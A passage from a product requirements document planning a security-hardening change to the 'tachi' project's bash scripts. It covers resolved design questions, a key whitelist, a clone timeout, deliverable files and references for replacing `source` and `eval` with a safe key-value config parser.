**Scenario**: A downstream adopter forks tachi and adds a custom stack-pack with `defaults.env` containing a key like `MY_ORG_CUSTOM_FLAG=true` that's not in `STACK_PACK_ALLOWED_KEYS=(TECH_STACK TECH_STACK_DATABASE TECH_STACK_VECTOR TECH_STACK_AUTH CLOUD_PROVIDER)`. With Q-2 Option (b) — whitelist REQUIRED for `init.sh:106` — this load FAILS exit 8 even though the value passes the regex. Downstream-fork-custom-keys is a real adoption pattern (BLP-01 already saw such forks); the first downstream fork to hit this without warning will file a confusion issue.

**Mitigation (PM choice — defer extension point to follow-on)**:
1. **CHANGELOG migration note**: F-2's CHANGELOG entry includes "to add custom config keys, fork must update `STACK_PACK_ALLOWED_KEYS` array in `init.sh`" with a worked example. This is the documented escape hatch for downstream forks in v1.0.
2. **Schema documentation**: `contracts/stack-pack-defaults-schema.md` (NEW deliverable per Q-2 + L-3) documents the allowed-key universe and the schema-update protocol (any new key requires updating both the schema doc AND the `STACK_PACK_ALLOWED_KEYS` array in `init.sh`, in lockstep).
3. **Extension point deferred**: `STACK_PACK_EXTRA_KEYS` env-var extension point (e.g., `STACK_PACK_EXTRA_KEYS=(MY_ORG_CUSTOM_FLAG)` that the load function appends to the whitelist) is **deferred to a follow-on feature** — PM choice. Rationale: F-2's scope is the security primitive; an extension API is a separate feature surface that deserves its own PRD + ADR amendment. The CHANGELOG migration note + schema doc are sufficient mitigation for v1.0; a follow-on can add `STACK_PACK_EXTRA_KEYS` if downstream-fork demand emerges.

The schema doc + CHANGELOG note resolves the documentation gap; the extension point deferral keeps F-2 surface bounded.

---

## 🎯 Open Questions

All six open questions (Q-1..Q-6) have been **RESOLVED** in Pass 1 reviews. The original questions are preserved here for the deliberation trail; the resolutions are documented in §Open Question Resolutions (v1.1) above. Each Q-N is annotated with status and pointer to the resolution section.

### Q-1 (Architect) — F-2a/F-2b split decision — **RESOLVED → Single PR by default; split reserved as Day-5 contingency**

→ See §Open Question Resolutions (v1.1) Q-1 for full adjudicator decision + rationale + folded-into citations.

**Question**: Single ~700-1100 LOC PR vs split into F-2a (config-load library + 2 sites: `init.sh:106` defaults.env + `template-git.sh:561/501` aod-kit-version) and F-2b (remaining 2 sites: `template-substitute.sh` eval-based dynamic assignment + TOCTOU on personalization.env + clone timeout)?

**Resolution**: **Single PR by default** (Architect Pass 1 ruling, Team-Lead concurs from schedule angle). F-2a/F-2b split is the Day-5 slip-watch contingency lever (per §Timeline Day-5 Slip-Watch Checkpoint), NOT the default path.

### Q-2 (Architect) — Allowed-keys whitelist enforcement policy — **RESOLVED → Option (b)**

→ See §Open Question Resolutions (v1.1) Q-2 for full adjudicator decision + rationale + folded-into citations.

**Question**: Should the optional 3rd argument `<allowed_keys_array_name>` be REQUIRED for `init.sh:106` (defaults.env), or should the regex alone be sufficient? More broadly: for which call sites is the whitelist mandatory vs optional?

**Resolution**: **Option (b)** (Architect Pass 1 ruling). Whitelist REQUIRED for `init.sh:106` (stack-pack defaults.env, untrusted contributed content) AND `template-substitute.sh:162` (personalization.env, has known canonical-12 set); OPTIONAL for `template-git.sh:561/:501` (aod-kit-version, has 5 well-documented fields with per-field validators that run after load).

### Q-2.5 (Architect, follow-up) — KEY case policy — **RESOLVED → `upper` + `lower` ONLY (NOT `mixed`)**

→ See §Open Question Resolutions (v1.1) Q-2.5 for full adjudicator decision + rationale + folded-into citations.

**Question**: Does the canonical regex's uppercase-only KEY constraint hold for all sites, or does FR-3 path-A's 4th-arg `<key_case>` parameter ship in the v1.0 library? If the parameter ships, what are its permitted values? (`upper` default, `lower`, `mixed`?)

**Resolution**: SHIP the 4th-arg `<key_case>` parameter in v1.0 with values `upper` (default — matches FR-1 regex) and `lower` (version-file site only) ONLY. NOT `mixed`. Rationale: there is NO mixed-case site; shipping `mixed` invites future case-insensitive content with illusory security.

### Q-3 (Architect) — Clone timeout default value and `AOD_FETCH_TIMEOUT=0` semantics — **RESOLVED → Option (a)**

→ See §Open Question Resolutions (v1.1) Q-3 for full adjudicator decision + rationale + folded-into citations.

**Question**: Is 60s default reasonable, or should it scale with repository size? Should `AOD_FETCH_TIMEOUT=0` mean "no timeout" (escape hatch for legitimate slow fetches) or be rejected (fail-fast on misconfiguration)?

**Resolution**: **Option (a)** (Architect Pass 1 ruling). 60s default; `AOD_FETCH_TIMEOUT=0` REJECTED with exit 1 as invalid input. Regex `^[1-9][0-9]*$` excludes `0`, leading-zero values, negatives, non-integers. Rationale: footgun framing — adopters should not be able to silently disable the protection.

### Q-4 (Team-Lead + Architect concur) — Library-file location convention — **RESOLVED → Option (a)**

→ See §Open Question Resolutions (v1.1) Q-4 for full adjudicator decision + rationale + folded-into citations.

**Question**: New library file at `.aod/scripts/bash/template-config-load.sh` consistent with F-1's `init-input.sh` precedent (sibling-file convention), or co-locate with `template-validate.sh` (single-file consolidation)?

**Resolution**: **Option (a)** (Team-Lead Pass 1 ruling, Architect concurs). Sibling file `.aod/scripts/bash/template-config-load.sh` per F-1 precedent. Co-locating with `template-validate.sh` would conflate two different concerns; standalone sourced file is the cleanest unit-test surface.

### Q-5 (Team-Lead + Architect concur) — Performance regression handling threshold — **RESOLVED → Tiered ladder with refinements**

→ See §Open Question Resolutions (v1.1) Q-5 for full adjudicator decision + rationale + folded-into citations.

**Question**: If `aod_template_load_kv_file` is >25% slower than `source` on the canonical 4-file fixture (per SC-10 / NFR-4 thresholds), what is the action?

**Resolution**: Tiered ladder per PRD draft, with refinements (Team-Lead Pass 1 ruling, Architect concurs): per-file delta NOT aggregate; canonical fixture set documented in ADR-040 §Consequences (4 real config files); 100 invocations × 4 fixtures × p50/p95 methodology; warm/cold cache reported separately; awk micro-optimization REJECTED. Tiered ladder: ≤5% no-op; 5-25% loosen NFR-4 to 25%; 25-50% accept-and-document with ADR §Consequences raw numbers + security tradeoff rationale; >50% PM escalate for re-scope.

### Q-6 (Architect) — ADR-040 status path — **RESOLVED → Proposed → Accepted dual-commit pattern**

→ See §Open Question Resolutions (v1.1) Q-6 for full adjudicator decision + rationale + folded-into citations.

**Question**: Should ADR-040 ship as a single-commit `Status: Accepted` at merge, or as a Proposed → Accepted dual-commit pattern (per F-1 ADR-038 precedent)?

**Resolution**: **Proposed → Accepted dual-commit** (Architect Pass 1 ruling). First commit lands `Status: Proposed` during Stream 3 (early in build); second commit promotes to `Status: Accepted` after Stream 5 verification (post-CI matrix green, pre-merge). Tasks.md decomposes into T-X.1 (Proposed) and T-X.2 (Accepted).

---

## 📦 Deliverable

**Single feature branch**: `256-source-pattern-hardening`

**Single squash-merged PR** with title: `feat(256): harden source-pattern surface — bash source/eval → KV parser + clone timeout`

**Files modified** (estimated, ~700-1100 LOC across 5 files + tests, per BLP-02 §F-2 §Format):

- `.aod/scripts/bash/template-config-load.sh` — **NEW** (the canonical `aod_template_load_kv_file` library; ~150-200 LOC including comment headers + the function body + bash 3.2-compatible per-line iteration with B-3 CRLF/leading-whitespace handling + whitelist lookup + `<key_case>` parameter handling + defensive `printf -v` identifier check + `printf -v` assignment).
- `scripts/init.sh` — refactored at `:106`; new `STACK_PACK_ALLOWED_KEYS` array + library source at top + downstream `STACK_*` rename pass; ~30-50 LOC delta.
- `.aod/scripts/bash/init-input.sh` — modified per B-2 Path R-2: `aod_init_read_validated` validator amended to additionally reject `$`, `\`, backtick at the prompt boundary; ~5-10 LOC delta.
- `.aod/scripts/bash/template-git.sh` — refactored at `aod_template_write_version_file:485-515` (inner round-trip block at `:501`, per H-3 correction) and `:561` (aod-kit-version sourcing); new clone-timeout watchdog at `:102-104` with SIGINT trap (per L-1); ~80-120 LOC delta (clone timeout is the bulk).
- `.aod/scripts/bash/template-substitute.sh` — refactored at `:217, :249, :536, :558` (eval removal; `:558` uses no-`:-` form per H-4) + `:566-571` (writer escape pass removal per B-2 Path R-2 + M-3) + `:162-209` (TOCTOU collapse); ~50-70 LOC delta (mostly net reduction from the 47-line subshell-validate-then-source collapsing to ~7 lines + escape pass removal).
- `tests/scripts/test_template_config_load_unit.py` — **NEW** (~250-350 LOC; 27 test cases per v1.1 expansion including B-1 empty-value, B-3 CRLF/leading-whitespace/no-trailing-newline cases, H-1 lower-mode + defensive identifier check).
- `tests/scripts/test_template_config_load_integration.py` — **NEW** (~150-250 LOC; per-site adversarial fixtures with M-1 framing precision + H-2 TOCTOU residual fixture).
- `tests/scripts/test_template_git_clone_timeout.py` — **NEW** (~100-150 LOC; hanging-upstream fixture + override + reject-zero + writer→reader round-trip per H-3).
- `tests/scripts/test_init_sh_defaults_env.py` — **NEW** (~80-120 LOC; per-stack-pack happy path + tampered-fixture rejection).
- `tests/scripts/test_template_substitute_lint_no_eval.py` — **NEW** (~30-50 LOC; lint-style backstop, renamed per L-2).
- `tests/scripts/conftest.py` — modified to add session-scoped `hanging_upstream` fixture per M-3 (per F-250 ADR-039 fixture-scope canon); ~20-30 LOC delta.
- `tests/fixtures/config-load/valid/` — **NEW** directory (valid KV fixtures per L-2).
- `tests/fixtures/config-load/adversarial/` — **NEW** directory (adversarial KV fixtures per L-2; each file carries a `# DO NOT SOURCE` header comment).
- `tests/fixtures/regenerate-config-load-baseline.sh` — **NEW** (~50-80 LOC; F-1 M-5 precedent).
- `docs/architecture/02_ADRs/ADR-040-config-file-parsing-hardening.md` — **NEW** (dual-commit Proposed → Accepted per Q-6; ~250-400 LOC including 6-alternatives-considered enumeration per M-5 + Q-1 single-PR-bundle decision documentation + canonical fixture set + benchmark methodology + footgun rationale + TOCTOU residual race window framing).
- `CHANGELOG.md` — entry under v4.x with: (a) the migration command for the (extremely unlikely) adopter whose config files contained non-KV bash, (b) the `AOD_FETCH_TIMEOUT` env-var documentation, (c) the link to ADR-040, (d) note tied to F-2 documenting F-1's `aod_init_read_validated` amendment to reject `$`, `\`, backtick at prompt boundary (per B-2 Path R-2), (e) downstream-fork custom-config-keys migration note per R-8 (instructs forks to update `STACK_PACK_ALLOWED_KEYS` array in `init.sh`).
- `.security/vulnerabilities.jsonl` — 5 `REMEDIATED` events post-merge.
- `contracts/stack-pack-defaults-schema.md` — **NEW** (per Q-2 + L-3 ruling; NOT conditional. Documents `STACK_PACK_ALLOWED_KEYS` source-of-truth, the 5 allowed keys with brief descriptions, and the schema-update protocol). ~100-150 LOC.

**Public artifacts**:
- ADR-040 in `docs/architecture/02_ADRs/`.
- CHANGELOG entry under v4.x.
- Release-please release PR within ~30s post-merge.
- `_internal/` memory note updated (`project_blp02_enterprise_hardening.md` — Wave 2 closed).

---

## 📚 References

- **Issue**: [#256](https://github.com/davidmatousek/tachi/issues/256) — Source-Pattern Hardening (BLP-02 Wave 2)
- **F-1 PRD precedent**: [`docs/product/02_PRD/248-substitution-surface-hardening-2026-05-03.md`](./248-substitution-surface-hardening-2026-05-03.md) — Pass 1 / Pass 2 governance review patterns; pytest-via-subprocess test runner adjudication; release-please belt-and-suspenders pattern.
- **F-1 ADR**: [`docs/architecture/02_ADRs/ADR-038-placeholder-substitution-strategy.md`](../../architecture/02_ADRs/ADR-038-placeholder-substitution-strategy.md) — substitution canon; shared validation triplet pattern with F-2.
- **F-250 ADR**: [`docs/architecture/02_ADRs/ADR-039-test-architecture-fixture-scope-and-asymmetric-baseline.md`](../../architecture/02_ADRs/ADR-039-test-architecture-fixture-scope-and-asymmetric-baseline.md) — test-architecture canon; F-2 fixture-regen script follows this convention.
- **Security scan**: `.aod/results/security-scan.md` (2026-05-02 research scan, 11 findings) §F-defaults-env, §F-aod-kit-version, §F-eval, §F-toctou, §F-clone-timeout.
- **Daniel Wood LinkedIn note**: 2026-05-02 — sed-based substitution flagged; BLP-02 was opened in response. F-2 extends the closed-loop posture-response cadence from F-1's substitution surface to F-2's source-pattern surface. Per F-1 precedent, ADR-040 §References will pin a `web.archive.org` snapshot of the LinkedIn thread.
- **Existing `source` call sites (target for refactor)**:
  - `scripts/init.sh:106` (`source "stacks/$SELECTED_PACK/defaults.env"`).
  - `.aod/scripts/bash/template-git.sh:561` (`source "$path"` in `aod_template_read_version_file`).
  - `.aod/scripts/bash/template-git.sh:485-515` inner round-trip block at `:501` (`source "$tmp_path" 2>/dev/null` in `aod_template_write_version_file`, **per H-3 correction** — v1.0 incorrectly named `aod_template_validate_version_content` which does not exist on `main`).
  - `.aod/scripts/bash/template-substitute.sh:162-209` (`aod_template_load_personalization_env` subshell-validate-then-caller-source double-read).
- **Existing `eval` call sites (target for refactor)**:
  - `.aod/scripts/bash/template-substitute.sh:217` (read-side indirect lookup).
  - `.aod/scripts/bash/template-substitute.sh:249` (write-side dynamic assignment).
  - `.aod/scripts/bash/template-substitute.sh:536` (write-side lookup in `aod_template_init_personalization`).
  - `.aod/scripts/bash/template-substitute.sh:558` (write-side lookup, secondary).
- **Clone site (target for timeout wrapping)**: `.aod/scripts/bash/template-git.sh:102-104` in `aod_template_fetch_upstream`.
- **`AOD_CANONICAL_PLACEHOLDERS` array (whitelist source-of-truth for personalization.env site)**: `.aod/scripts/bash/template-substitute.sh:50-63`.
- **Vulnerabilities log**: `.security/vulnerabilities.jsonl` (5 `DETECTED` events for F-2's vulns).
- **SARIF report**: `.security/reports/8ab6c9c718cb980629717b1216c12587f861411e.sarif` (2026-05-02 scan).
- **Recent ADR (highest number)**: `docs/architecture/02_ADRs/ADR-039-test-architecture-fixture-scope-and-asymmetric-baseline.md` — next ADR is **040**.
- **F-212 release-please recovery incident**: `.claude/rules/git-workflow.md` Reference Incident section. F-2 follows the belt-and-suspenders pattern.
- **Constitution**: `.aod/memory/constitution.md` — F-2 alignment §III + §VIII.
- **Git workflow**: `.claude/rules/git-workflow.md` — `feat(NNN):` PR title required for release-please; squash-merge convention.
- **BLP-02 backlog memory**: `_internal/strategy/BLP-02-enterprise-hardening.md` — Wave 2 §F-2 specification; the source-of-truth this PRD operationalizes.
- **BLP-02 closure tracking**: `project_blp02_enterprise_hardening.md` (memory) — initiative status; updates on F-2 close.
